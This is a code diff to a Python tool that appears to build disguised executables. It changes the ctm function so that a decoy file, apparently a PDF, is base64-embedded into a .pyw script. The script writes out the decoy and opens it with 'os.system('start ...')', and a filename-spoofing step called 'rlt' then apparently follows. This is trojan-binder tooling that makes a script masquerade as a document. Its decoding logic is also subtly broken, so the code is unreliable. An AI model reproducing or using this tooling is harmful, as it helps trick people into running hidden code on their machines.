@@ -30,6 +30,7 @@
 import os
 import time
 import sys
+import base64
 
 logo = """
 
@@ -104,14 +105,26 @@ def ctm(command):
             argv1 = str(argv1)+"w"
             f = open(argv1, "r")
             contents = f.readlines()
-            contents.insert(0, f"os.system('start {argv2}')\n")
+            contents.insert(0, f"import base64, os\n")
+            pdf_f = open(f"{argv2}", "br")
+            pdfcontent = pdf_f.read()
+            pdf_f.close()
+            contents.insert(1, f"f = open('{argv2}', 'w')\n")
+            encoded_pdf = str(pdfcontent).encode('ascii')
+            b64_pdf = base64.b64encode(encoded_pdf)
+            b64_pdf = b64_pdf.decode('ascii')
+            contents.insert(2, f"b64 = '''\n{b64_pdf}\n'''\n")
+            contents.insert(3, f"b64 = b64.encode('ascii')\n")
+            contents.insert(4, f"b64_decoded = base64.b64decode(b64)\n")
+            contents.insert(5, f"b64_decoded = b64_decoded.decode('ascii')\n")
+            contents.insert(6, f"f.write(b64_decoded)\n")
+            contents.insert(7, f"f.close()\n")
+            contents.insert(8, f"os.system('start {argv2}')\n")
             f.close()
             f = open(argv1, "w")
             f.write("".join(contents))
             f.close()
             argv2 = argv2.split(".")
-            print(argv2)
-            print(argv1)
             rlt(f"rlt {argv1} {argv2[1]}")
 
     else:
